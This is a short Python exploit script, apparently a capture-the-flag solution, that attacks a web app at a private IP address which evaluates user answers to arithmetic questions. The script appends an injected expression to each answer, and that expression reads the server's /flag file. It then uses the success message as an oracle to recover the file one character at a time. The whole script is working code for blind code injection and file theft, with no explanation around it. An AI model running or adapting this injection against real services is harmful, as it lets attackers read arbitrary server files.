#!/usr/bin/env python3
#-*- coding:utf-8 -*-
#__author__: 颖奇L'Amore www.gem-love.com

import requests
import re
from urllib.parse import quote as urlencode

def main():
    alphabet = ['{','}', '@', '_',',','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
    data={"input":""}
    s = requests.Session()

    flag = ''
    for i in range(0,100):
        for char in alphabet:
            try:
                r = s.post("http://172.16.44.122", data={"input":""})
                question = re.search(r"<h4>(.*)</h4>", r.content.decode(), re.M|re.I).group().replace("<h4>", "").replace("</h4>","")[:-1]
                print(question)
                data["input"] = "{0} and '{2}'==(open('/flag','r').read()[{1}])".format(question, i, char)
                r = s.post("http://172.16.44.122", data=data)
                result = r.content.decode()
                # print(char, end=' ')
                # print(re.search(r"<h3>(.*)</h3>", result, re.M|re.I).group())
                # print(data)
                if r"Congratulations" in result:
                    flag += char
                    print(flag)
                    break
            except Exception as e:
                print("Exception: ", end='')
                print(e)

if __name__ == '__main__':
    main()